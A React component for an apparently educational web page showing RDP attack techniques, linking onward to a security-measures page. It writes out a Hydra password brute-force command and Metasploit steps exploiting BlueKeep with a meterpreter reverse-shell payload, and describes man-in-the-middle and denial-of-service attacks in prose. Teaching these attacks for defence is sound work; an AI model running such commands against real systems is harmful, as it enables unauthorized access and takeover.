import React from 'react';
import './Demonstration.css';
import {Link} from "react-router-dom";

const Demonstration: React.FC = () => {
    return (
        <div className="demonstration-container">
            <h1 className="demonstration-title">Demonstration of RDP Exploitation Techniques</h1>

            {/* Example 1: Brute Force */}
            <div className="demonstration-block">
                <h2 className="demonstration-subtitle">Example 1: Brute Force with Hydra or Ncrack</h2>
                <p className="demonstration-description">
                    Tools like Hydra or Ncrack allow you to test credentials on an RDP connection.
                </p>
                <div className="command-block">
                    <code>hydra -l administrator -P passwords.txt rdp://192.168.1.100</code>
                </div>
                <p className="demonstration-explanation">
                    <strong>Logic Explanation:</strong> This attack tries all combinations of
                    the <code>passwords.txt</code> file to access
                    the RDP server via the administrator user.
                </p>
            </div>

            {/* Example 2: Exploiting BlueKeep */}
            <div className="demonstration-block">
                <h2 className="demonstration-subtitle">Example 2: Exploiting BlueKeep</h2>
                <p className="demonstration-description">
                    Using Metasploit to exploit the BlueKeep vulnerability and gain a remote shell:
                </p>
                <div className="command-block">
                    <code>
                        msfconsole<br/>
                        use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br/>
                        set RHOSTS 192.168.1.100<br/>
                        set PAYLOAD windows/x64/meterpreter/reverse_tcp<br/>
                        exploit
                    </code>
                </div>
                <p className="demonstration-explanation">
                    <strong>Explanation:</strong> Once the vulnerability is exploited, the attacker gains full access to
                    the remote system.
                </p>
            </div>

            {/* Example 3: Man-in-the-Middle Attack */}
            <div className="demonstration-block">
                <h2 className="demonstration-subtitle">Example 3: Man-in-the-Middle Attack on RDP</h2>
                <p className="demonstration-description">
                    Using tools like Ettercap or MITMf to intercept an RDP session. A MitM attack can compromise the
                    integrity of communications
                    if authentication or encryption are not properly configured.
                </p>
            </div>

            {/* Example 4: Denial of Service Attack */}
            <div className="demonstration-block">
                <h2 className="demonstration-subtitle">Example 4: Denial of Service Attack</h2>
                <p className="demonstration-description">
                    Sending massive requests to a server's RDP port to cause a system overload. Example with Slowloris
                    or other suitable DoS tools.
                </p>
            </div>
            <div className="button-container">
                <Link to="/security-measures" className="rdp-button">
                    Learn About Security Measures
                </Link>
            </div>
        </div>
    );
};

export default Demonstration;
